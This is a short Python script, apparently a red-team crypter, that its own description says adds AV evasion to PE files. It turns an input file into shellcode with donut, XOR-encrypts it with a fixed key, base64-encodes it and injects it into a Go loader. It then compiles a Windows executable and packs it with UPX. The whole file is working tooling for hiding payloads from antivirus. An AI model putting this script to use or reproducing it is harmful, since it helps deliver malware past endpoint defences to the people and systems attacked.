#!/usr/bin/env python3

import donut
import os
import base64
import argparse
from itertools import cycle
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Adds AV evasion to PE files)')
    parser.add_argument('infile',  type=str, help='input file (shellcode)')
    parser.add_argument('outfile',  type=str, help='output file (executeable)')
    args = parser.parse_args()

    shellcode = donut.create(file=args.infile)
    key = b"xct"
    keylen = len(key)
    temp  = []
    for i in range(0, len(shellcode)): 
        temp.append(shellcode[i] ^ key[i % keylen]) 
    encrypted = bytes(temp)     
    base64shellcode = base64.b64encode(encrypted)
    os.system("cp load.go load.go.bak")
    with open("load.go") as f:
        temp = f.read().replace('<base64shellcode>',base64shellcode.decode())
    with open("load.go", "w") as f:
        f.write(temp)
    os.system("GOOS=windows GOARCH=amd64 go build -o raw.exe load.go")
    os.system("upx raw.exe -o "+args.outfile)
    os.system("cp load.go.bak load.go; rm load.go.bak; rm raw.exe; rm loader.bin")
